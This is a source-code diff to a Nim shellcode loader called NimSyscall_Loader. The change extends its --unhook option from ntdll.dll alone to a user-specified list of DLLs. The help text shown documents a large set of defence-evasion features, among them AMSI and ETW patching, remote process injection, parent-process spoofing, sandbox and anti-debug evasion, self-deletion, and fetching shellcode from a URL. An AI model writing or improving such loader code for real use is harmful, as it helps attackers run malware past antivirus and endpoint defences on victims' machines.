@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -131,7 +131,7 @@ Options:
   --sleep 10    Sleep 10 seconds before decryption to evade memory scanners
   --sleep-in-between 10    Sleep 10 seconds at some potentially critical steps in between to evade memory scanners
   --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
-  --unhook    Unhook ntdll.dll before doing anything else for the current process
+  --unhook value    Unhook the specified DLL before doing anything else for the current process
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
   --macPayload    Convert the encrypted Shellcode to MAC-Adresses to reduce entropy (for embedded Payloads only)
   --sgn    Encode shellcode via SGN before encrypting it
@@ -237,6 +237,8 @@ var
     dll_out: bool = false
     dllfunc: string = ""
     dllexportfunctions: seq[string]
+    dllNames: seq[string]
+    unDlls: string = ""
     dllhijack: bool = false
     dllclone: bool = false
     dllToClone: string = ""
@@ -613,6 +615,9 @@ if args["--COMVARETW"]:
 
 if args["--unhook"]:
   unhook = true
+  let unhookdlls = args["--unhook"]
+  unDlls = fmt"{unhookdlls}"
+  dllNames = unDlls.split(',')
 
 if args["--sleep"]:
   sleeptime = parse_int($args["--sleep"])
@@ -2305,8 +2310,10 @@ when defined(stomb):
     cfgspawn = true
     when defined(carokann):
         var stombFunc2 = obf("{stombFunc2}")
-    
 
+when defined(unhook):
+    var dllNames: seq[string] = {dllNames}
+    
 when defined(carokann):
     var originalscLength: DWORD = {originalScLength}
 
@@ -3710,7 +3717,7 @@ if(unhook):
     elif(syswhispers):
         if (not noDInvoke):
             stub.add(DInvokeUnhookStubs)
-    stub.add(UnhookNtdllStub)
+    stub.add(UnhookStub)
 
 stub.add(getRandStub())
 
